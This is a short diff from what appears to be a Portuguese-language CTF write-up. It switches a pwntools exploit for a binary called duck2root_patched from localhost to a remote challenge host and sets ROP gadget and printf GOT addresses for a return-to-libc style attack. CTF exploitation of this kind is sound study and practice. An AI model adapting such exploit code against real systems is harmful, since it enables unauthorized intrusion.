@@ -362,7 +362,7 @@ EXPLOIT QUE FINALMENTE FUNCIONA (depois de muitas iterações, perguntas e dúvi
 from pwn import * 
 
 exe = process('./duck2root_patched')
-p = remote("localhost", 5001)
+p = remote("tribopapaxota.org", 5001)
 
 pop_rdi = 0x40126d
 printf_at_got = 0x404018
